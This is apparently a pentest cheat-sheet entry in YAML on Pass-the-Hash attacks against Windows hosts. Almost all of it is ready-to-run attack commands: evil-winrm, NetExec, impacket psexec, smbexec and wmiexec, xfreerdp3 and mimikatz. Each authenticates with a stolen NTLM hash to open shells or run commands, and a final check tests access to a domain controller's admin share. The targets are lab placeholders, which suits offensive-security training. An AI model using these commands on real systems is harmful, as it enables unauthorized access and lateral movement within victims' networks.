---
description: |
  Pass-the-Hash (PtH) — authenticate using NTLM hashes instead of plaintext passwords across SMB, WinRM, and RDP.
commands:
  - have: Hash
    cmd: |
      # Evil-WinRM — pass-the-hash for WinRM shell
      evil-winrm -i 10.10.10.27 -u sec_user -H NTHASH

      # NetExec — PtH command execution via SMB
      nxc smb 10.10.10.27 -u sec_user -H NTHASH -x "whoami"

      # PsExec — PtH interactive shell
      impacket-psexec senshu.sh/sec_user@10.10.10.27 -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH

      # SmbExec — PtH semi-interactive shell
      impacket-smbexec senshu.sh/sec_user@10.10.10.27 -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH

      # WmiExec — PtH via WMI
      impacket-wmiexec senshu.sh/sec_user@10.10.10.27 -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH

      # xfreerdp3 — PtH for RDP
      xfreerdp3 /v:10.10.10.27 /u:sec_user /pth:NTHASH /d:senshu.sh

      # Mimikatz — PtH (spawns new process with hash)
      mimikatz.exe "sekurlsa::pth /user:sec_user /domain:senshu.sh /ntlm:NTHASH"

      # NetExec — PtH over RDP
      nxc rdp 10.10.10.27 -u sec_user -H NTHASH

      # Verify access from PtH shell
      dir \\DC.senshu.sh\C$
phase:
  - Exploitation
target_os:
  - Windows
services:
  - SMB
  - WinRM
  - RDP
techniques:
  - Pass-the-Hash
references:
  - https://github.com/fortra/impacket
  - https://github.com/Hackplayers/evil-winrm
  - https://www.netexec.wiki/
---
